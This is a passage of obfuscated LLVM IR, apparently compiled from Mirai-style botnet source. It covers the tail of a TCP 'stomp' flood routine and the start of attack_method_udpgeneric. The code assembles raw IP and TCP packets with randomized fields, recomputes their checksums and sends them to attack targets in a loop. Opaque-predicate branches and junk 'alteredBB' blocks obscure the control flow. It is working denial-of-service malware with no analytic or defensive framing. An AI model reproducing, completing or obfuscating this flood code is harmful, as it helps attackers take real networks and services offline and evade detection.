  %647 = urem i32 %646, 2
  %648 = icmp eq i32 %647, 0
  %649 = icmp slt i32 %644, 10
  %650 = or i1 %648, %649
  br i1 %650, label %originalBB141, label %originalBB141alteredBB

originalBB141:                                    ; preds = %originalBB141alteredBB, %642
  %651 = call i64 @time(i64* null) #6
  %652 = load i64, i64* %31, align 8
  %653 = sub nsw i64 %651, %652
  %654 = icmp sgt i64 %653, 10
  %655 = load i32, i32* @x.31
  %656 = load i32, i32* @y.32
  %657 = sub i32 %655, 1
  %658 = mul i32 %655, %657
  %659 = urem i32 %658, 2
  %660 = icmp eq i32 %659, 0
  %661 = icmp slt i32 %656, 10
  %662 = or i1 %660, %661
  br i1 %662, label %originalBBpart2144, label %originalBB141alteredBB

originalBBpart2144:                               ; preds = %originalBB141
  br i1 %654, label %663, label %666

; <label>:663:                                    ; preds = %originalBBpart2144
  %664 = load i32, i32* %26, align 4
  %665 = call i32 @close(i32 %664)
  br label %137

; <label>:666:                                    ; preds = %originalBBpart2144
  br label %255

; <label>:667:                                    ; preds = %482
  br label %668

; <label>:668:                                    ; preds = %667, %140
  %669 = load i32, i32* %9, align 4
  %670 = add nsw i32 %669, 1
  store i32 %670, i32* %9, align 4
  br label %115

; <label>:671:                                    ; preds = %115
  br label %672

; <label>:672:                                    ; preds = %originalBBpart2167, %671
  store i32 0, i32* %9, align 4
  br label %673

; <label>:673:                                    ; preds = %originalBBpart2163, %672
  %674 = load i32, i32* %9, align 4
  %675 = load i8, i8* %5, align 1
  %676 = zext i8 %675 to i32
  %677 = icmp slt i32 %674, %676
  br i1 %677, label %678, label %814

; <label>:678:                                    ; preds = %673
  %679 = load i8**, i8*** %12, align 8
  %680 = load i32, i32* %9, align 4
  %681 = sext i32 %680 to i64
  %682 = getelementptr inbounds i8*, i8** %679, i64 %681
  %683 = load i8*, i8** %682, align 8
  store i8* %683, i8** %39, align 8
  %684 = load i8*, i8** %39, align 8
  %685 = bitcast i8* %684 to %struct.iphdr*
  store %struct.iphdr* %685, %struct.iphdr** %40, align 8
  %686 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %687 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %686, i64 1
  %688 = bitcast %struct.iphdr* %687 to %struct.tcphdr*
  store %struct.tcphdr* %688, %struct.tcphdr** %41, align 8
  %689 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %690 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %689, i64 1
  %691 = bitcast %struct.tcphdr* %690 to i8*
  store i8* %691, i8** %42, align 8
  %692 = load i16, i16* %14, align 2
  %693 = zext i16 %692 to i32
  %694 = icmp eq i32 %693, 65535
  br i1 %694, label %695, label %717

; <label>:695:                                    ; preds = %678
  %696 = load i32, i32* @x.31
  %697 = load i32, i32* @y.32
  %698 = sub i32 %696, 1
  %699 = mul i32 %696, %698
  %700 = urem i32 %699, 2
  %701 = icmp eq i32 %700, 0
  %702 = icmp slt i32 %697, 10
  %703 = or i1 %701, %702
  br i1 %703, label %originalBB146, label %originalBB146alteredBB

originalBB146:                                    ; preds = %originalBB146alteredBB, %695
  %704 = call i32 @rand_next()
  %705 = and i32 %704, 65535
  %706 = trunc i32 %705 to i16
  %707 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %708 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %707, i32 0, i32 3
  store i16 %706, i16* %708, align 4
  %709 = load i32, i32* @x.31
  %710 = load i32, i32* @y.32
  %711 = sub i32 %709, 1
  %712 = mul i32 %709, %711
  %713 = urem i32 %712, 2
  %714 = icmp eq i32 %713, 0
  %715 = icmp slt i32 %710, 10
  %716 = or i1 %714, %715
  br i1 %716, label %originalBBpart2152, label %originalBB146alteredBB

originalBBpart2152:                               ; preds = %originalBB146
  br label %717

; <label>:717:                                    ; preds = %originalBBpart2152, %678
  %718 = load i8, i8* %25, align 1
  %719 = icmp ne i8 %718, 0
  br i1 %719, label %720, label %723

; <label>:720:                                    ; preds = %717
  %721 = load i8*, i8** %42, align 8
  %722 = load i32, i32* %24, align 4
  call void @rand_str(i8* %721, i32 %722)
  br label %723

; <label>:723:                                    ; preds = %720, %717
  %724 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %725 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %724, i32 0, i32 7
  store i16 0, i16* %725, align 2
  %726 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %727 = bitcast %struct.iphdr* %726 to i16*
  %728 = call zeroext i16 @checksum_generic(i16* %727, i32 20)
  %729 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %730 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %729, i32 0, i32 7
  store i16 %728, i16* %730, align 2
  %731 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %732 = load i32, i32* %9, align 4
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %731, i64 %733
  %735 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %734, i32 0, i32 1
  %736 = load i32, i32* %735, align 4
  %737 = add i32 %736, 1
  store i32 %737, i32* %735, align 4
  %738 = trunc i32 %736 to i16
  %739 = call zeroext i16 @htons(i16 zeroext %738) #7
  %740 = zext i16 %739 to i32
  %741 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %742 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %741, i32 0, i32 2
  store i32 %740, i32* %742, align 4
  %743 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %744 = load i32, i32* %9, align 4
  %745 = sext i32 %744 to i64
  %746 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %743, i64 %745
  %747 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %746, i32 0, i32 2
  %748 = load i32, i32* %747, align 4
  %749 = trunc i32 %748 to i16
  %750 = call zeroext i16 @htons(i16 zeroext %749) #7
  %751 = zext i16 %750 to i32
  %752 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %753 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %752, i32 0, i32 3
  store i32 %751, i32* %753, align 4
  %754 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %755 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %754, i32 0, i32 6
  store i16 0, i16* %755, align 4
  %756 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %757 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %758 = bitcast %struct.tcphdr* %757 to i8*
  %759 = load i32, i32* %24, align 4
  %760 = sext i32 %759 to i64
  %761 = add i64 20, %760
  %762 = trunc i64 %761 to i16
  %763 = call zeroext i16 @htons(i16 zeroext %762) #7
  %764 = load i32, i32* %24, align 4
  %765 = sext i32 %764 to i64
  %766 = add i64 20, %765
  %767 = trunc i64 %766 to i32
  %768 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %756, i8* %758, i16 zeroext %763, i32 %767)
  %769 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %770 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %769, i32 0, i32 6
  store i16 %768, i16* %770, align 4
  %771 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %772 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %771, i32 0, i32 1
  %773 = load i16, i16* %772, align 2
  %774 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %775 = load i32, i32* %9, align 4
  %776 = sext i32 %775 to i64
  %777 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %774, i64 %776
  %778 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %777, i32 0, i32 0
  %779 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %778, i32 0, i32 1
  store i16 %773, i16* %779, align 2
  %780 = load i32, i32* %10, align 4
  %781 = load i8*, i8** %39, align 8
  %782 = load i32, i32* %24, align 4
  %783 = sext i32 %782 to i64
  %784 = add i64 40, %783
  %785 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %786 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %787 = load i32, i32* %9, align 4
  %788 = sext i32 %787 to i64
  %789 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %786, i64 %788
  %790 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %789, i32 0, i32 0
  %791 = bitcast %struct.sockaddr_in* %790 to %struct.sockaddr*
  store %struct.sockaddr* %791, %struct.sockaddr** %785, align 8
  %792 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %793 = load %struct.sockaddr*, %struct.sockaddr** %792, align 8
  %794 = call i64 @sendto(i32 %780, i8* %781, i64 %784, i32 16384, %struct.sockaddr* %793, i32 16)
  br label %795

; <label>:795:                                    ; preds = %723
  %796 = load i32, i32* @x.31
  %797 = load i32, i32* @y.32
  %798 = sub i32 %796, 1
  %799 = mul i32 %796, %798
  %800 = urem i32 %799, 2
  %801 = icmp eq i32 %800, 0
  %802 = icmp slt i32 %797, 10
  %803 = or i1 %801, %802
  br i1 %803, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %795
  %804 = load i32, i32* %9, align 4
  %805 = add nsw i32 %804, 1
  store i32 %805, i32* %9, align 4
  %806 = load i32, i32* @x.31
  %807 = load i32, i32* @y.32
  %808 = sub i32 %806, 1
  %809 = mul i32 %806, %808
  %810 = urem i32 %809, 2
  %811 = icmp eq i32 %810, 0
  %812 = icmp slt i32 %807, 10
  %813 = or i1 %811, %812
  br i1 %813, label %originalBBpart2163, label %originalBB154alteredBB

originalBBpart2163:                               ; preds = %originalBB154
  br label %673

; <label>:814:                                    ; preds = %673
  %815 = load i32, i32* @x.31
  %816 = load i32, i32* @y.32
  %817 = sub i32 %815, 1
  %818 = mul i32 %815, %817
  %819 = urem i32 %818, 2
  %820 = icmp eq i32 %819, 0
  %821 = icmp slt i32 %816, 10
  %822 = or i1 %820, %821
  br i1 %822, label %originalBB165, label %originalBB165alteredBB

originalBB165:                                    ; preds = %originalBB165alteredBB, %814
  %823 = load i32, i32* @x.31
  %824 = load i32, i32* @y.32
  %825 = sub i32 %823, 1
  %826 = mul i32 %823, %825
  %827 = urem i32 %826, 2
  %828 = icmp eq i32 %827, 0
  %829 = icmp slt i32 %824, 10
  %830 = or i1 %828, %829
  br i1 %830, label %originalBBpart2167, label %originalBB165alteredBB

originalBBpart2167:                               ; preds = %originalBB165
  br label %672

; <label>:831:                                    ; preds = %originalBBpart237, %111, %105
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %120
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %141
  %832 = load i32, i32* %26, align 4
  %833 = load i32, i32* %26, align 4
  %834 = call i32 (i32, i32, ...) @fcntl(i32 %833, i32 3, i32 0)
  %_ = sub i32 0, %834
  %gen = add i32 %_, 2048
  %_2 = shl i32 %834, 2048
  %835 = or i32 %834, 2048
  %836 = call i32 (i32, i32, ...) @fcntl(i32 %832, i32 4, i32 %835)
  %837 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %837, align 4
  %838 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %839 = load i32, i32* %9, align 4
  %840 = sext i32 %839 to i64
  %841 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %838, i64 %840
  %842 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %841, i32 0, i32 2
  %843 = load i8, i8* %842, align 4
  %844 = zext i8 %843 to i32
  %845 = icmp slt i32 %844, 32
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %172
  %846 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %847 = load i32, i32* %9, align 4
  %848 = sext i32 %847 to i64
  %849 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %846, i64 %848
  %850 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %849, i32 0, i32 1
  %851 = load i32, i32* %850, align 4
  %852 = call i32 @ntohl(i32 %851) #7
  %853 = call i32 @rand_next()
  %854 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %855 = load i32, i32* %9, align 4
  %856 = sext i32 %855 to i64
  %857 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %854, i64 %856
  %858 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %857, i32 0, i32 2
  %859 = load i8, i8* %858, align 4
  %860 = zext i8 %859 to i32
  %_7 = sub i32 0, %853
  %gen8 = add i32 %_7, %860
  %_9 = shl i32 %853, %860
  %_10 = sub i32 %853, %860
  %gen11 = mul i32 %_10, %860
  %861 = lshr i32 %853, %860
  %_12 = sub i32 %852, %861
  %gen13 = mul i32 %_12, %861
  %_14 = sub i32 0, %852
  %gen15 = add i32 %_14, %861
  %_16 = sub i32 0, %852
  %gen17 = add i32 %_16, %861
  %_18 = sub i32 0, %852
  %gen19 = add i32 %_18, %861
  %_20 = sub i32 %852, %861
  %gen21 = mul i32 %_20, %861
  %862 = add i32 %852, %861
  %863 = call i32 @htonl(i32 %862) #7
  %864 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %865 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %864, i32 0, i32 0
  store i32 %863, i32* %865, align 4
  br label %originalBB6

originalBB25alteredBB:                            ; preds = %originalBB25, %222
  %866 = call i32 @rand_next()
  %_26 = sub i32 0, %866
  %gen27 = add i32 %_26, 65535
  %_28 = shl i32 %866, 65535
  %_29 = sub i32 %866, 65535
  %gen30 = mul i32 %_29, 65535
  %_31 = shl i32 %866, 65535
  %867 = and i32 %866, 65535
  %868 = trunc i32 %867 to i16
  %869 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %868, i16* %869, align 2
  br label %originalBB25

originalBB35alteredBB:                            ; preds = %originalBB35, %266
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %307
  %870 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %871 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %870, i32 0, i32 4
  %872 = load i16, i16* %871, align 4
  %_40 = sub i16 0, %872
  %gen41 = add i16 %_40, 9
  %_42 = sub i16 %872, 9
  %gen43 = mul i16 %_42, 9
  %_44 = shl i16 %872, 9
  %_45 = sub i16 0, %872
  %gen46 = add i16 %_45, 9
  %_47 = sub i16 %872, 9
  %gen48 = mul i16 %_47, 9
  %_49 = sub i16 0, %872
  %gen50 = add i16 %_49, 9
  %873 = lshr i16 %872, 9
  %_51 = sub i16 %873, 1
  %gen52 = mul i16 %_51, 1
  %874 = and i16 %873, 1
  %875 = zext i16 %874 to i32
  %876 = icmp ne i32 %875, 0
  br label %originalBB39

originalBB56alteredBB:                            ; preds = %originalBB56, %331
  %877 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %878 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %877, i32 0, i32 4
  %879 = load i16, i16* %878, align 4
  %_57 = sub i16 0, %879
  %gen58 = add i16 %_57, 12
  %_59 = sub i16 0, %879
  %gen60 = add i16 %_59, 12
  %_61 = shl i16 %879, 12
  %_62 = shl i16 %879, 12
  %_63 = sub i16 0, %879
  %gen64 = add i16 %_63, 12
  %880 = lshr i16 %879, 12
  %_65 = sub i16 0, %880
  %gen66 = add i16 %_65, 1
  %_67 = sub i16 0, %880
  %gen68 = add i16 %_67, 1
  %_69 = sub i16 0, %880
  %gen70 = add i16 %_69, 1
  %_71 = sub i16 0, %880
  %gen72 = add i16 %_71, 1
  %881 = and i16 %880, 1
  %882 = zext i16 %881 to i32
  %883 = icmp ne i32 %882, 0
  br label %originalBB56

originalBB76alteredBB:                            ; preds = %originalBB76, %355
  %884 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %885 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %884, i32 0, i32 0
  %886 = load i32, i32* %885, align 4
  %887 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %888 = load i32, i32* %9, align 4
  %889 = sext i32 %888 to i64
  %890 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %887, i64 %889
  %891 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %890, i32 0, i32 0
  store i32 %886, i32* %891, align 4
  %892 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %893 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %892, i32 0, i32 2
  %894 = load i32, i32* %893, align 4
  %895 = call i32 @ntohl(i32 %894) #7
  %896 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %897 = load i32, i32* %9, align 4
  %898 = sext i32 %897 to i64
  %899 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %896, i64 %898
  %900 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %899, i32 0, i32 1
  store i32 %895, i32* %900, align 4
  %901 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %902 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %901, i32 0, i32 3
  %903 = load i32, i32* %902, align 4
  %904 = call i32 @ntohl(i32 %903) #7
  %905 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %906 = load i32, i32* %9, align 4
  %907 = sext i32 %906 to i64
  %908 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %905, i64 %907
  %909 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %908, i32 0, i32 2
  store i32 %904, i32* %909, align 4
  %910 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %911 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %910, i32 0, i32 1
  %912 = load i16, i16* %911, align 2
  %913 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %914 = load i32, i32* %9, align 4
  %915 = sext i32 %914 to i64
  %916 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %913, i64 %915
  %917 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %916, i32 0, i32 3
  store i16 %912, i16* %917, align 4
  %918 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %919 = load i16, i16* %918, align 2
  %920 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %921 = load i32, i32* %9, align 4
  %922 = sext i32 %921 to i64
  %923 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %920, i64 %922
  %924 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %923, i32 0, i32 4
  store i16 %919, i16* %924, align 2
  %925 = load i32, i32* %24, align 4
  %926 = sext i32 %925 to i64
  %_77 = sub i64 0, 40
  %gen78 = add i64 %_77, %926
  %_79 = sub i64 40, %926
  %gen80 = mul i64 %_79, %926
  %_81 = sub i64 0, 40
  %gen82 = add i64 %_81, %926
  %_83 = shl i64 40, %926
  %_84 = shl i64 40, %926
  %927 = add i64 40, %926
  %928 = call noalias i8* @malloc(i64 %927) #6
  %929 = load i8**, i8*** %12, align 8
  %930 = load i32, i32* %9, align 4
  %931 = sext i32 %930 to i64
  %932 = getelementptr inbounds i8*, i8** %929, i64 %931
  store i8* %928, i8** %932, align 8
  %933 = load i8**, i8*** %12, align 8
  %934 = load i32, i32* %9, align 4
  %935 = sext i32 %934 to i64
  %936 = getelementptr inbounds i8*, i8** %933, i64 %935
  %937 = load i8*, i8** %936, align 8
  %938 = bitcast i8* %937 to %struct.iphdr*
  store %struct.iphdr* %938, %struct.iphdr** %36, align 8
  %939 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %940 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %939, i64 1
  %941 = bitcast %struct.iphdr* %940 to %struct.tcphdr*
  store %struct.tcphdr* %941, %struct.tcphdr** %37, align 8
  %942 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %943 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %942, i64 1
  %944 = bitcast %struct.tcphdr* %943 to i8*
  store i8* %944, i8** %38, align 8
  %945 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %946 = bitcast %struct.iphdr* %945 to i8*
  %947 = load i8, i8* %946, align 4
  %_85 = sub i8 0, %947
  %gen86 = add i8 %_85, 15
  %_87 = shl i8 %947, 15
  %_88 = sub i8 %947, 15
  %gen89 = mul i8 %_88, 15
  %_90 = shl i8 %947, 15
  %_91 = shl i8 %947, 15
  %_92 = sub i8 %947, 15
  %gen93 = mul i8 %_92, 15
  %_94 = sub i8 0, %947
  %gen95 = add i8 %_94, 15
  %948 = and i8 %947, 15
  %_96 = sub i8 0, %948
  %gen97 = add i8 %_96, 64
  %_98 = sub i8 0, %948
  %gen99 = add i8 %_98, 64
  %_100 = sub i8 0, %948
  %gen101 = add i8 %_100, 64
  %_102 = sub i8 0, %948
  %gen103 = add i8 %_102, 64
  %_104 = shl i8 %948, 64
  %949 = or i8 %948, 64
  store i8 %949, i8* %946, align 4
  %950 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %951 = bitcast %struct.iphdr* %950 to i8*
  %952 = load i8, i8* %951, align 4
  %_105 = sub i8 %952, -16
  %gen106 = mul i8 %_105, -16
  %_107 = sub i8 %952, -16
  %gen108 = mul i8 %_107, -16
  %953 = and i8 %952, -16
  %_109 = sub i8 0, %953
  %gen110 = add i8 %_109, 5
  %_111 = sub i8 0, %953
  %gen112 = add i8 %_111, 5
  %_113 = shl i8 %953, 5
  %_114 = sub i8 0, %953
  %gen115 = add i8 %_114, 5
  %_116 = sub i8 0, %953
  %gen117 = add i8 %_116, 5
  %954 = or i8 %953, 5
  store i8 %954, i8* %951, align 4
  %955 = load i8, i8* %13, align 1
  %956 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %957 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %956, i32 0, i32 1
  store i8 %955, i8* %957, align 1
  %958 = load i32, i32* %24, align 4
  %959 = sext i32 %958 to i64
  %_118 = sub i64 40, %959
  %gen119 = mul i64 %_118, %959
  %960 = add i64 40, %959
  %961 = trunc i64 %960 to i16
  %962 = call zeroext i16 @htons(i16 zeroext %961) #7
  %963 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %964 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %963, i32 0, i32 2
  store i16 %962, i16* %964, align 2
  %965 = load i16, i16* %14, align 2
  %966 = call zeroext i16 @htons(i16 zeroext %965) #7
  %967 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %968 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %967, i32 0, i32 3
  store i16 %966, i16* %968, align 4
  %969 = load i8, i8* %15, align 1
  %970 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %971 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %970, i32 0, i32 5
  store i8 %969, i8* %971, align 4
  %972 = load i8, i8* %16, align 1
  %973 = icmp ne i8 %972, 0
  br label %originalBB76

originalBB123alteredBB:                           ; preds = %originalBB123, %462
  %974 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %975 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %976 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %975, i32 0, i32 4
  store i16 %974, i16* %976, align 2
  br label %originalBB123

originalBB127alteredBB:                           ; preds = %originalBB127, %604
  %977 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %978 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %977, i32 0, i32 4
  %979 = load i16, i16* %978, align 4
  %_128 = sub i16 %979, 8
  %gen129 = mul i16 %_128, 8
  %_130 = sub i16 %979, 8
  %gen131 = mul i16 %_130, 8
  %980 = lshr i16 %979, 8
  %_132 = sub i16 %980, 1
  %gen133 = mul i16 %_132, 1
  %_134 = sub i16 %980, 1
  %gen135 = mul i16 %_134, 1
  %_136 = sub i16 0, %980
  %gen137 = add i16 %_136, 1
  %981 = and i16 %980, 1
  %982 = zext i16 %981 to i32
  %983 = icmp ne i32 %982, 0
  br label %originalBB127

originalBB141alteredBB:                           ; preds = %originalBB141, %642
  %984 = call i64 @time(i64* null) #6
  %985 = load i64, i64* %31, align 8
  %_142 = shl i64 %984, %985
  %986 = sub nsw i64 %984, %985
  %987 = icmp sgt i64 %986, 10
  br label %originalBB141

originalBB146alteredBB:                           ; preds = %originalBB146, %695
  %988 = call i32 @rand_next()
  %_147 = sub i32 0, %988
  %gen148 = add i32 %_147, 65535
  %_149 = sub i32 0, %988
  %gen150 = add i32 %_149, 65535
  %989 = and i32 %988, 65535
  %990 = trunc i32 %989 to i16
  %991 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %992 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %991, i32 0, i32 3
  store i16 %990, i16* %992, align 4
  br label %originalBB146

originalBB154alteredBB:                           ; preds = %originalBB154, %795
  %993 = load i32, i32* %9, align 4
  %_155 = sub i32 %993, 1
  %gen156 = mul i32 %_155, 1
  %_157 = shl i32 %993, 1
  %_158 = shl i32 %993, 1
  %_159 = shl i32 %993, 1
  %_160 = sub i32 %993, 1
  %gen161 = mul i32 %_160, 1
  %994 = add nsw i32 %993, 1
  store i32 %994, i32* %9, align 4
  br label %originalBB154

originalBB165alteredBB:                           ; preds = %originalBB165, %814
  br label %originalBB165
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.33
  %6 = load i32, i32* @y.34
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i16, align 2
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %36 = load i8, i8* %13, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %19, align 8
  %40 = load i8, i8* %15, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %20, align 1
  %44 = load i8, i8* %15, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %21, align 2
  %48 = load i8, i8* %15, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %22, align 1
  %52 = load i8, i8* %15, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %23, align 1
  %56 = load i8, i8* %15, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %24, align 2
  %60 = load i8, i8* %15, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %25, align 2
  %64 = load i8, i8* %15, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %26, align 2
  %68 = load i8, i8* %15, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 1, i32 1)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %27, align 1
